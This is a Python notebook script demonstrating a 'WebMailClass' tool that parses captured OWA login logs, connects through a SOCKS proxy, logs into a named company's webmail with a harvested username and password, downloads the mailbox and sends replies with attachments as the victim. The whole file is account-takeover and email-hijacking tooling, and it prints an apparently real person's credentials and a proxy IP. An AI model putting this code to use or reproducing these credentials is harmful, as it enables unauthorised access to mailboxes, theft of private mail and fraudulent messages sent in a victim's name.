#!/usr/bin/env python
# coding: utf-8

# In[ ]:


from WebMailClass import WebMailClass
from pyvirtualdisplay import Display


#WebMailClass Usage:
#for example we have url and http_data
url='https://mail.pintoconstruction.com/owa/auth.owa'
logs_data='destination=https%3A%2F%2Fmail.pintoconstruction.com%2FOWA%2F&flags=0&forcedownlevel=0&trusted=0&username=irene.forlenza&password=irene&isUtf8=1'

socks_address='142.234.157.99'
socks_port=38200

#first method parse it:
client, login, password = WebMailClass(socks_address,socks_port).LogsParser(logs_data,url)
print(client, login, password)
#if your socks are OK output must be (True, 'irene.forlenza', 'irene')
#_________________________________
#next method -StartSession
#ATTENTION

#If you need to create sessionfor grabbing -  please  set True last argument - it turns on light version (easy to parse)
#url from logs
login='irene.forlenza'
password='irene'
session=WebMailClass('142.234.157.99',38200).StartSession(login, password, url ,True)

#Let's start to grab emails

mails=WebMailClass('142.234.157.99',38200).WebMailGrabber(session)

#mails = [{id:id,body:body,header:header}]


#If you need to send an answer - set False grabber mode put body answer and id and attachment path

session=WebMailClass('142.234.157.99',38200).StartSession(login, password, url ,False)
WebMailClass('142.234.157.99',38200).SendEmail(session,'RgAAAAAQerHOjuyBRr2HcvxEqbzFBwDW+5uMZs37Q5oumjN9rvtWAAAAEeLVAACZXIgohX82T40iCFX4jLugAAeK2krvAAAJ','ok',True,True,attachment=False)



